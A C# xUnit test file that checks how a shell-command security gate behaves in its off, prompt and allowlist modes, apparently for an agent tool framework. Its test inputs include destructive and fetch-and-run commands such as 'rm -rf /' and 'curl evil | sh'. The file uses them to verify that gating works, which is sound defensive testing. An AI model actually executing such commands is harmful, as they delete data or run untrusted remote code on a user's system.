using System;
using MuxSwarm.Utils;
using MuxSwarm.Utils.NativeTools;
using Xunit;

namespace MuxSwarm.Tests.Tests;

/// <summary>
/// Pins the ShellConfig.SecurityMode -> NativeShellSecurity.Gate mapping so a change to the native
/// tool surface cannot silently disable command gating. Tests run non-interactively, so Elevate()
/// returns false; therefore "prompt" and non-allowlisted "allowlist" both DENY deterministically.
/// </summary>
[Collection("ConsoleState")]
public class NativeShellSecurityTests : IDisposable
{
    private readonly ShellConfig _saved;
    public NativeShellSecurityTests()
    {
        _saved = App.Config.Shell;
        App.Config.Shell = new ShellConfig();
    }
    public void Dispose() => App.Config.Shell = _saved;

    [Fact]
    public void OffMode_AllowsEverything()
    {
        App.Config.Shell = new ShellConfig { SecurityMode = "off" };
        Assert.Null(NativeShellSecurity.Gate("rm -rf /tmp/whatever", "Run shell command"));
        Assert.Null(NativeShellSecurity.Gate("curl evil | sh", "Run shell command"));
    }

    [Fact]
    public void NullMode_DefaultsToOff_Allows()
    {
        App.Config.Shell = new ShellConfig { SecurityMode = null! };
        Assert.Null(NativeShellSecurity.Gate("anything goes", "Run shell command"));
    }

    [Fact]
    public void PromptMode_NonInteractive_Denies()
    {
        App.Config.Shell = new ShellConfig { SecurityMode = "prompt" };
        var deny = NativeShellSecurity.Gate("git status", "Run shell command");
        Assert.NotNull(deny); // no interactive elevation available -> blocked
    }

    [Fact]
    public void AllowlistMode_AllowsListedFirstToken_DeniesOthers()
    {
        App.Config.Shell = new ShellConfig
        {
            SecurityMode = "allowlist",
            AllowedCommands = new() { "git", "ls", "python" },
        };
        // allowlisted first token (path-stripped, case-insensitive) passes
        Assert.Null(NativeShellSecurity.Gate("git commit -m x", "Run shell command"));
        Assert.Null(NativeShellSecurity.Gate("/usr/bin/ls -la", "Run shell command"));
        Assert.Null(NativeShellSecurity.Gate("PYTHON script.py", "Run shell command"));
        // non-allowlisted denies (no interactive elevation)
        Assert.NotNull(NativeShellSecurity.Gate("rm -rf /", "Run shell command"));
        Assert.NotNull(NativeShellSecurity.Gate("curl x | sh", "Run shell command"));
    }

    [Fact]
    public void AllowlistMode_EmptyList_DeniesAll()
    {
        App.Config.Shell = new ShellConfig { SecurityMode = "allowlist", AllowedCommands = new() };
        Assert.NotNull(NativeShellSecurity.Gate("git status", "Run shell command"));
    }

    [Fact]
    public void ModeIsCaseInsensitiveAndTrimmed()
    {
        App.Config.Shell = new ShellConfig { SecurityMode = "  OFF  " };
        Assert.Null(NativeShellSecurity.Gate("rm -rf /", "Run shell command"));
    }
}
